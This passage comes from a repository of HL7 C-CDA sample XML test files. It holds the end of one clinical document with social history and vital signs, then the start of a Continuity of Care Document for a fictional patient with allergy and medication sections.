									<text>
										<reference value="#result5"/>
									</text>
									<!-- Status of this test is active -->
									<statusCode code="active"/>
									<effectiveTime value="20141015103026-0500"/>
									<!-- This should represent what the EHR or other system received from the lab -->
									<!-- The more common scenario is the result is not present (i.e. you wouldn't include anything)-->
									<!-- The task force created this example becasue it came up during certification testing-->
									<!-- We do not believe this is a common scenario -->
									<value xsi:type="PQ" nullFlavor="NA"/>
									<!-- intepretationCode and referenceRange are omitted since pending result. You could also show as null -->
								</observation>
							</component>
						</organizer>
					</entry>
				</section>
			</component>
			<!-- ******************* SOCIAL HISTORY ********************* -->
			<component>
				<section>
					<!--  ** Social history section ** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.17" extension="2014-06-09"/>
					<code code="29762-2" codeSystem="2.16.840.1.113883.6.1" displayName="Social History"/>
					<title>SOCIAL HISTORY</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Social History Observation</th>
									<th>Description</th>
									<th>Dates Observed</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Current Smoking Status</td>
									<td>
										<content ID="soc1"/>Unknown if ever smoked</td>
									<td>September 10, 2012 11:45am</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<observation classCode="OBS" moodCode="EVN">
							<!-- ** Current smoking status observation ** -->
							<templateId root="2.16.840.1.113883.10.20.22.4.78" extension="2014-06-09"/>
							<id extension="123456789" root="2.16.840.1.113883.19"/>
							<code code="72166-2" codeSystem="2.16.840.1.113883.6.1" displayName="Tobacco smoking status NHIS"/>
							<statusCode code="completed"/>
							<!-- This template represents a “snapshot in time” observation, simply reflecting what the patient’s 
								current smoking status is at the time of the observation. As a result, the effectiveTime is 
								constrained to just a time stamp, and will approximately correspond with the author/time. -->
							<effectiveTime value="20141001103026-0500"/>
							<!-- The value represents the patient's smoking status currently observed. -->
							<value xsi:type="CD" code="266927001" displayName="Tobacco smoking consumption unknown" codeSystem="2.16.840.1.113883.6.96"/>
							<author typeCode="AUT">
								<time value="20141001103026-0500"/>
								<assignedAuthor>
									<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
								</assignedAuthor>
							</author>
						</observation>
					</entry>
				</section>
			</component>
			<!-- ************* VITAL SIGNS *************** -->
			<component>
				<section>
					<!-- ** Vital Signs section with entries required ** -->
					<!-- Only select vital signs are shown below but a more complete list of common vital signs may include: -->
					<!-- Height, Weight, Body Mass Index, Systolic Blood Pressure, Diastloic Blood Pressure, Heart Rate (Pulse)
					 Respiratory Rate, Pulse Oximetry (spO2), Temperature, Body Surface Area, Head Circumference-->
					<templateId root="2.16.840.1.113883.10.20.22.2.4.1" extension="2014-06-09"/>
					<code code="8716-3" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Vital signs"/>
					<title>Vital Signs (Last Filed)</title>
					<text>
						<table>
							<thead>
								<tr>
									<th>Date</th>
									<th>Blood Pressure</th>
									<th>Pulse</th>
									<th>Temperature</th>
									<th>Respiratory Rate</th>
									<th>Height</th>
									<th>Weight</th>
									<th>BMI</th>
									<th>SpO2</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>05/20/2014 7:36pm</td>
									<!-- You can consolidate Systolic and Diastolic in human view if desired but should retain separate references-->
									<td>
										<content ID="SystolicBP_1">120</content>/<content ID="DiastolicBP_1">80</content>mm[Hg] </td>
									<td ID="Pulse_1">80 /min</td>
									<td ID="Temp_1">37.2 C</td>
									<td ID="RespRate_1">18 /min</td>
									<td ID="Height_1">170.2 cm</td>
									<td ID="Weight_1">108.8 kg</td>
									<td ID="BMI_1">37.58 kg/m2</td>
									<td ID="SPO2_1">98%</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<!-- When a set of vital signs are recorded together, include them in single clustered organizer-->
						<organizer classCode="CLUSTER" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.26" extension="2014-06-09"/>
							<id root="e6c800c4-4a71-41bf-80e2-e741dd1168e9"/>
							<code code="74728-7" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="VITAL SIGNS"/>
							<statusCode code="completed"/>
							<effectiveTime value="20141001103026-0500"/>
							<!-- Each vital sign should be its own component. Note that systolic and diastolic BP must be separate components-->
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="fdbd831b-5919-4f06-9467-76b07022f8e8"/>
									<code code="8480-6" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Systolic blood pressure"/>
									<text>
										<!-- This reference identifies content in human readable formatted text-->
										<reference value="#SystolicBP_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<!-- Example of Value with UCUM unit. Note that metric units used in this example-->
									<value xsi:type="PQ" value="120" unit="mm[Hg]"/>
									<!-- Additional information of interpretation and/or reference range may be included but are optional-->
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="553f3f45-9046-4659-b3e7-5de904003550"/>
									<code code="8462-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Diastolic blood pressure"/>
									<text>
										<reference value="#DiastolicBP_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="80" unit="mm[Hg]"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="77bfe276-a1dd-4372-9072-e603905acc07"/>
									<code code="8867-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Heart rate"/>
									<text>
										<reference value="#Pulse_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="80" unit="/min"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="24faa204-db62-4610-864f-cb50b650d0fa"/>
									<code code="8310-5" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Body temperature"/>
									<text>
										<reference value="#Temp_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="37.2" unit="Cel"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="79f25395-8ec6-488b-8c05-becc97f79995"/>
									<code code="9279-1" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Respiratory rate"/>
									<text>
										<reference value="#RespRate_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="18" unit="/min"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="6d3fa9f8-6049-41bd-b0c3-b0196bb6bd37"/>
									<code code="8302-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Body height"/>
									<text>
										<reference value="#Height_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="170.2" unit="cm"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="2594e631-2189-4e72-9dd1-d6769ee2a7be"/>
									<code code="3141-9" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="WEIGHT"/>
									<text>
										<reference value="#Weight_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="108.863" unit="kg"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="5858e765-2ffe-413f-9197-260f2c6e7aa8"/>
									<code code="39156-5" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Body mass index (BMI) [Ratio]"/>
									<text>
										<reference value="#BMI_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="37.58" unit="kg/m2"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
							<component>
								<observation classCode="OBS" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
									<id root="4ce6046c-f6e3-41b0-91fc-2d5325f2bbc3"/>
									<code code="2710-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="OXYGEN SATURATION"/>
									<text>
										<reference value="#SPO2_1"/>
									</text>
									<statusCode code="completed"/>
									<effectiveTime value="20141001103026-0500"/>
									<value xsi:type="PQ" value="98" unit="%"/>
									<author typeCode="AUT">
										<time value="20141001103026-0500"/>
										<assignedAuthor>
											<id extension="5555555555" root="1.1.1.1.1.1.1.2"/>
										</assignedAuthor>
									</author>
								</observation>
							</component>
						</organizer>
					</entry>
				</section>
			</component>
		</structuredBody>
	</component>
</ClinicalDocument>
</file>

<file path="sample_data/test_files/small/hl7/ccda-problems-external-ref.xml">
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="CDA.xsl"?>
<!--
 Title:        Continuity of Care Document (CCD)
 
 This file was based on MU testing file named: 170.315_b1_toc_gold_sample2_v2.xml
 All component/section wihtin structuredBody have been emptied to provide a template for testing specific entries
 
 ********************************************************
 Disclaimer: This sample file contains representative data elements to represent a Continuity of Care Document (CCD). 
 The file depicts a fictional character's health data. Any resemblance to a real person is coincidental. 
 To illustrate as many data elements as possible, the clinical scenario may not be plausible. 
 The data in this sample file is not intended to represent real patients, people or clinical events. 
 This sample is designed to be used in conjunction with the C-CDA Clinical Notes Implementation Guide.
 ********************************************************
 -->
<ClinicalDocument xmlns="urn:hl7-org:v3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="C:\XML\CDA_SDTC_Schema\infrastructure\cda\CDA_SDTC.xsd"
	xmlns:voc="urn:hl7-org:v3/voc" xmlns:sdtc="urn:hl7-org:sdtc">
	<realmCode code="US"/>
	<typeId extension="POCD_HD000040" root="2.16.840.1.113883.1.3"/>
	<!-- US Realm Header ID-->
	<templateId root="2.16.840.1.113883.10.20.22.1.1" extension="2015-08-01"/>
	<templateId root="2.16.840.1.113883.10.20.22.1.1"/>
	<!-- CCD template ID-->
	<templateId root="2.16.840.1.113883.10.20.22.1.2" extension="2015-08-01"/>
	<templateId root="2.16.840.1.113883.10.20.22.1.2"/>
	<!-- Globally unique identifier for the document  -->
	<id extension="TT662" root="2.16.840.1.113883.19.5.99999.1"/>
	<code code="34133-9" displayName="Summary of episode note" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
	<!-- Title of this document -->
	<title>170.315_b1_toc_gold_sample2 test data</title>

	<effectiveTime value="201507221800-0500" />

	<confidentialityCode code="N" displayName="normal" codeSystem="2.16.840.1.113883.5.25" codeSystemName="Confidentiality"/>
	<languageCode code="en-US"/>
	<setId extension="sTT662" root="2.16.840.1.113883.19.5.99999.19"/>
	<!-- Version of this document -->
	<versionNumber value="1"/>
	<recordTarget>
		<patientRole>
			<id extension="414122222" root="2.16.840.1.113883.4.1"/>
			<!-- Example Social Security Number using the actual SSN OID. -->
			<addr use="HP">
				<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
				<streetAddressLine>1357 Amber Dr</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97006</postalCode>
				<country>US</country>
				<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
			</addr>
			<telecom value="tel:+1(555)-777-1234" use="MC"/>
			<telecom value="tel:+1(555)-723-1544" use="HP"/>
			<!-- HP is "primary home" from HL7 AddressUse 2.16.840.1.113883.5.1119 -->
			<patient>
				<name use="L">
					<given>Richard</given>
					<family>Maur</family>
					<suffix>jr</suffix>
				</name>
				<administrativeGenderCode code="M" displayName="Male" codeSystem="2.16.840.1.113883.5.1" codeSystemName="AdministrativeGender"/>
				<!-- Date of birth need only be precise to the day -->
				<birthTime value="19800801"/>
				<maritalStatusCode nullFlavor="NI"/>
				<religiousAffiliationCode code="1013" displayName="Christian (non-Catholic, non-specific)" codeSystem="2.16.840.1.113883.5.1076" codeSystemName="HL7 Religious Affiliation"/>
				<raceCode nullFlavor="UNK"/>
				<sdtc:raceCode nullFlavor="UNK"/>
				<ethnicGroupCode nullFlavor="UNK"/>
				<languageCommunication>
					<languageCode code="en"/>
					<modeCode code="ESP" displayName="Expressed spoken"
						codeSystem="2.16.840.1.113883.5.60" codeSystemName="LanguageAbilityMode"/>
					<preferenceInd value="true"/>
				</languageCommunication>
			</patient>
			<providerOrganization>
				<id extension="99999999" root="2.16.840.1.113883.4.6"/>
				<name>Community Health and Hospitals</name>
				<telecom use="WP" value="tel:+1(555)-555-5000"/>
				<addr>
					<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>97266</postalCode>
					<country>US</country>
				</addr>
			</providerOrganization>
		</patientRole>
	</recordTarget>
	<!-- The author represents the person who provides the content in the document -->
	<author>
		<time value="20150722"/>
		<assignedAuthor>
			<id extension="111111" root="2.16.840.1.113883.4.6"/>
			<code code="281P00000X" codeSystem="2.16.840.1.113883.6.101"
				displayName="Hospitals; Chronic Disease Hospital"/>
			<addr>
				<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>97266</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-555-1002"/>
			<assignedPerson>
				<name>
					<prefix>Dr</prefix>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedAuthor>
	</author>
	<!-- The dataEnterer transferred the content created by the author into the document -->
	<dataEnterer>
		<assignedEntity>
			<id root="2.16.840.1.113883.4.6" extension="999999943252"/>
			<addr>
				<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>97266</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-555-1002"/>
			<assignedPerson>
				<name>
					<given>Mary</given>
					<family>McDonald</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</dataEnterer>
	<!-- The informant represents any sources of information for document content -->
	<informant>
		<assignedEntity>
			<id extension="KP00017" root="2.16.840.1.113883.19.5"/>
			<addr>
				<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>97266</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-555-1002"/>
			<assignedPerson>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</informant>
	<informant>
		<relatedEntity classCode="PRS">
			<!-- classCode PRS represents a person with personal relationship with the patient. -->
			<code code="SPS" displayName="SPOUSE" codeSystem="2.16.840.1.113883.1.11.19563"
				codeSystemName="Personal Relationship Role Type Value Set"/>
			<relatedPerson>
				<name>
					<given>Caroline</given>
					<family>Maur</family>
				</name>
			</relatedPerson>
		</relatedEntity>
	</informant>
	<!-- The custodian represents the organization charged with maintaining the original source document -->
	<custodian>
		<assignedCustodian>
			<representedCustodianOrganization>
				<id extension="99998899" root="2.16.840.1.113883.4.6"/>
				<name>Community Health and Hospitals</name>
				<telecom use="WP" value="tel:+1(555)-555-5000"/>
				<addr>
					<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
					<city>Portland</city>
					<state>OR</state>
					<postalCode>97266</postalCode>
					<country>US</country>
				</addr>
			</representedCustodianOrganization>
		</assignedCustodian>
	</custodian>
	<!-- The informationRecipient represents the intended recipient of the document -->
	<informationRecipient>
		<intendedRecipient>
			<informationRecipient>
				<name>
					<prefix>Dr</prefix>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</informationRecipient>
			<receivedOrganization>
				<name>Community Health and Hospitals</name>
			</receivedOrganization>
		</intendedRecipient>
	</informationRecipient>
	<!-- The legalAuthenticator represents the individual who is responsible for the document -->
	<legalAuthenticator>
		<time value="20150722"/>
		<signatureCode code="S"/>
		<assignedEntity>
			<id extension="999998899" root="2.16.840.1.113883.4.6"/>
			<addr>
				<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>97266</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-555-1002"/>
			<assignedPerson>
				<name>
					<prefix>Dr</prefix>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</legalAuthenticator>
	<!-- The authenticator represents the individual attesting to the accuracy of information in the document-->
	<authenticator>
		<time value="20150722"/>
		<signatureCode code="S"/>
		<assignedEntity>
			<id extension="999998899" root="2.16.840.1.113883.4.6"/>
			<addr>
				<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
				<city>Portland</city>
				<state>OR</state>
				<postalCode>97266</postalCode>
				<country>US</country>
			</addr>
			<telecom use="WP" value="tel:+1(555)-555-1002"/>
			<assignedPerson>
				<name>
					<prefix>Dr</prefix>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</authenticator>
	<!-- The participant represents supporting entities -->
	<participant typeCode="IND">
		<!-- patient's grandfather -->
		<associatedEntity classCode="PRS">
			<code code="GPARNT" displayName="grandparent" codeSystem="2.16.840.1.113883.1.11.19563"
				codeSystemName="Personal Relationship Role Type Value Set"/>
			<addr use="HP">
				<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
				<streetAddressLine>1357 Amber Dr</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97006</postalCode>
				<country>US</country>
				<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
			</addr>
			<telecom value="tel:+1(555)-723-1544" use="HP"/>
			<associatedPerson>
				<name>
					<prefix>Mr.</prefix>
					<given>Issac</given>
					<family>Maur</family>
				</name>
			</associatedPerson>
		</associatedEntity>
	</participant>
	<!-- Note: Entities playing multiple roles are recorded in multiple participants -->
	<participant typeCode="IND">
		<!-- patient's spouse -->
		<associatedEntity classCode="PRS">
			<code code="SPS" displayName="SPOUSE" codeSystem="2.16.840.1.113883.1.11.19563"
				codeSystemName="Personal Relationship Role Type Value Set"/>
			<addr use="HP">
				<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
				<streetAddressLine>1357 Amber Dr</streetAddressLine>
				<city>Beaverton</city>
				<state>OR</state>
				<postalCode>97006</postalCode>
				<country>US</country>
				<!-- US is "United States" from ISO 3166-1 Country Codes: 1.0.3166.1 -->
			</addr>
			<telecom value="tel:+1(555)-723-1544" use="HP"/>
			<associatedPerson>
				<name>
					<prefix>Ms</prefix>
					<given>Caroline</given>
					<family>Maur</family>
				</name>
			</associatedPerson>
		</associatedEntity>
	</participant>	
	<documentationOf>
		<serviceEvent classCode="PCPR">
			<code code="423123007" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED-CT"
				displayName="Burn caused by fire"/>
			<effectiveTime>
				<low value="201507221800-0500"/>
				<high value="20150722230000-5000"/>
			</effectiveTime>
			<!-- since there are two Care Team members we need two performer elements. -db -->
			<!-- Note: example of Care Team here:
			https://github.com/gecole/HL7-Task-Force-Examples/blob/master/CareTeamToC170.314b2Ambulatory.xml
			db -->
			<performer typeCode="PRF">
				<functionCode code="PCP" codeSystem="2.16.840.1.113883.5.88" codeSystemName="ParticipationFunction" displayName="primary care physician">
					<originalText>Primary Care Provider</originalText>
				</functionCode>
				<assignedEntity>
					<id extension="5555555555" root="2.16.840.1.113883.4.6"/>
					<code code="207QA0505X" displayName="Allopathic &amp; Osteopathic Physicians; Family Medicine, Adult Medicine" codeSystem="2.16.840.1.113883.6.101" codeSystemName="Healthcare Provider Taxonomy (HIPAA)"/>
					<addr>
						<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
						<city>Portland</city>
						<state>OR</state>
						<postalCode>97266</postalCode>
						<country>US</country>
					</addr>
					<telecom use="WP" value="tel:+1(555)-555-1002"/>
					<assignedPerson>
						<name>
							<prefix qualifier="TITLE">Dr</prefix>
							<given>Henry</given>
							<family>Seven</family>
						</name>
					</assignedPerson>
					<representedOrganization>
						<id extension="99998899" root="2.16.840.1.113883.4.6"/>
						<name>Community Health and Hospitals</name>
						<telecom use="WP" value="tel:+1(555)-555-5000"/>
						<addr>
							<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
							<city>Portland</city>
							<state>OR</state>
							<postalCode>97266</postalCode>
							<country>US</country>
						</addr>
					</representedOrganization>
				</assignedEntity>
			</performer>
			<performer typeCode="PRF">
				<!-- we do not have a function code for this person since recording as RN for now -->
				<time>
					<low nullFlavor="UNK"/>
				</time>
				<assignedEntity>
					<!-- this provider has an id, but it is not an NPI  -->
					<id extension="91138" root="1.3.6.1.4.1.22812.4.99930.4"/>
					<!-- the provider is a Registered Nurse - may not be so -->
					<!-- note: we don't know what Mary is from the test data
						 but since not specified, RN should not be an issue -db -->
					<code codeSystem="2.16.840.1.113883.6.101" codeSystemName="NUCC Health Care Provider Taxonomy" code="163W00000X" displayName="Nursing Service Providers; Registered Nurse"/>
					<addr>
						<streetAddressLine>1002 Healthcare Dr</streetAddressLine>
						<city>Portland</city>
						<state>OR</state>
						<postalCode>97266</postalCode>
						<country>US</country>
					</addr>
					<telecom use="WP" value="tel:+1(555)-555-1002"/>
					<assignedPerson>
						<name>
							<given>Mary</given>
							<family>McDonald</family>
						</name>
					</assignedPerson>
				</assignedEntity>
			</performer>			
		</serviceEvent>
	</documentationOf>
	<!-- added componentOf to represent encounter and to represent length of stay better as per SME suggestion -db -->
	<componentOf>
		<encompassingEncounter>
			<id extension="9937012" root="2.16.840.1.113883.19"/>
			<effectiveTime>
				<!-- represents length of time spent in hospital -db -->
				<low value="201507221800-0500"/>
				<high value="20150722230000-5000"/>
			</effectiveTime>			
		</encompassingEncounter>
	</componentOf>
	<!-- ******************************************************** CDA Body ******************************************************** -->
	<component>
		<structuredBody>

			<!-- ***************** ALLERGIES *************** -->
			<!-- No known allergies -->
			<component>
				<section>
					<!-- *** Allergies and Intolerances Section (entries required) (V3) *** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.6.1" extension="2015-08-01"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.6.1"/>
					<!-- Alerts section template -->
					<code code="48765-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC"/>
					<title>ALLERGIES AND ADVERSE REACTIONS</title>
					<text>No Known Drug Allergies</text>
					<!-- replaced Allergy Problem Act (R1.1) with 
					Allergy Concern Act (V3) to meet R2.1 validation requirements -DB-->
					<entry typeCode="DRIV">
						<act classCode="ACT" moodCode="EVN">
							<!-- ** Allergy Concern Act (V3) ** -->
							<templateId root="2.16.840.1.113883.10.20.22.4.30" extension="2015-08-01"/>
							<!--Critical Change-->
							<templateId root="2.16.840.1.113883.10.20.22.4.30"/>
							<id root="36e3e930-7b15-11db-9fe1-0831200c9a66"/>
							<code code="CONC" codeSystem="2.16.840.1.113883.5.6"/>
							<!-- The statusCode represents the need to continue tracking the allergy -->
							<!-- This is of ongoing concern to the provider -->
							<statusCode code="active"/>
							<effectiveTime>
								<!-- The low value represents when the allergy was first recorded in the patient's chart -->
								<low value="20150722"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<!-- using negationInd="true" to signify that there are is NO food allergy (disorder) allergy -db -->
								<observation classCode="OBS" moodCode="EVN" negationInd="true">
									<!-- ** Allergy observation (V2) ** -->
									<templateId root="2.16.840.1.113883.10.20.22.4.7" extension="2014-06-09"/>
									<templateId root="2.16.840.1.113883.10.20.22.4.7"/>
									<id root="4adc1020-7b16-11db-9fe1-0832200c9a66"/>
									<code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
									<statusCode code="completed"/>
									<effectiveTime nullFlavor="NA"/>
									<!-- using Drug allergy (disorder) along with negationInd instead -db -->
									<value xsi:type="CD" code="416098002"
										displayName="Allergy to drug (finding)"
										codeSystem="2.16.840.1.113883.6.96"
										codeSystemName="SNOMED CT">
									</value>
									<!-- In C-CDA R2 the participant is required. The SNOMED code ="105590001" displayName="Substance" could be used in the participant-->									
									<participant typeCode="CSM">
										<participantRole classCode="MANU">
											<playingEntity classCode="MMAT">
												<code nullFlavor="NA"/>
											</playingEntity>
										</participantRole>
									</participant>
								</observation>
							</entryRelationship>
						</act>
					</entry>					
				</section>
			</component>

			<!-- ******************************* MEDICATIONS ***************************** -->
			<!-- No known medications -->			
			<component>
				<section>
					<!-- *** Medications Section (entries required) (V2) *** -->
					<templateId root="2.16.840.1.113883.10.20.22.2.1.1" extension="2014-06-09"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.1.1"/>
					<code code="10160-0" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="HISTORY OF MEDICATION USE"/>
					<title>MEDICATIONS</title>
					<text>No known Medications</text>
					<entry>
						<!-- Act.actionNegationInd -->
						<substanceAdministration moodCode="EVN" classCode="SBADM" negationInd="true">
							<!-- ** Medication Activity (V2) ** -->
							<templateId root="2.16.840.1.113883.10.20.22.4.16" extension="2014-06-09"/>
							<templateId root="2.16.840.1.113883.10.20.22.4.16"/>
							<id root="cdbd33f0-6cde-11db-9fe1-0833200c9a66"/>
							<statusCode code="active"/>
							<effectiveTime nullFlavor="NA"/>
							<doseQuantity nullFlavor="NA"/>
							<consumable>
								<manufacturedProduct classCode="MANU">
									<!-- ** Medication information ** -->
									<templateId root="2.16.840.1.113883.10.20.22.4.23" extension="2014-06-09"/>
									<templateId root="2.16.840.1.113883.10.20.22.4.23"/>
									<manufacturedMaterial>
										<code nullFlavor="OTH" codeSystem="2.16.840.1.113883.6.88"> 
											<translation code="410942007" displayName="drug or medication"
												codeSystem="2.16.840.1.113883.6.96"            
												codeSystemName="SNOMED CT"/>
										</code>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
						</substanceAdministration>
					</entry>
				</section>
			</component>

			<!-- ******************************* MEDICATIONS ADMINISTERED			***************************** 
				NO known medications 
			-->
			<component>
				<section>
					<!-- The section contains the medications taken by the patient prior to 
					and 
					at the time of admission to the facility. -->
					<!-- Admission Medications Section (entries optional) (V3) -->
					<templateId root="2.16.840.1.113883.10.20.22.2.44" extension="2015-08-01"/>
					<templateId root="2.16.840.1.113883.10.20.22.2.44"/>
					<code code="42346-7" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="MEDICATIONS ON ADMISSION"/>
					<title>Admission Medications</title>
					<text>No Medications Administered</text>
					<entry>
						<!-- Act.actionNegationInd -->
						<substanceAdministration moodCode="EVN" classCode="SBADM" negationInd="true">
							<!-- ** Medication Activity (V2) ** -->
							<templateId root="2.16.840.1.113883.10.20.22.4.16" extension="2014-06-09"/>
							<templateId root="2.16.840.1.113883.10.20.22.4.16"/>
							<id root="cdbd33f0-6cde-11db-9fe1-0834200c9a66"/>
							<statusCode code="active"/>
							<effectiveTime nullFlavor="NA"/>
							<doseQuantity nullFlavor="NA"/>
							<consumable>
								<manufacturedProduct classCode="MANU">
									<!-- ** Medication information ** -->
									<templateId root="2.16.840.1.113883.10.20.22.4.23" extension="2014-06-09"/>
									<templateId root="2.16.840.1.113883.10.20.22.4.23"/>
									<manufacturedMaterial>
										<code nullFlavor="OTH" codeSystem="2.16.840.1.113883.6.88"> 
											<translation code="410942007" displayName="drug or medication"
												codeSystem="2.16.840.1.113883.6.96"            
												codeSystemName="SNOMED CT"/>
										</code>
									</manufacturedMaterial>
								</manufacturedProduct>
							</consumable>
						</substanceAdministration>
					</entry>
				</section>
			</component>	
			<!-- Added Discharge Medications Section (entries required) (V3) No known medications -->
			<component>
				<section nullFlavor="NI">
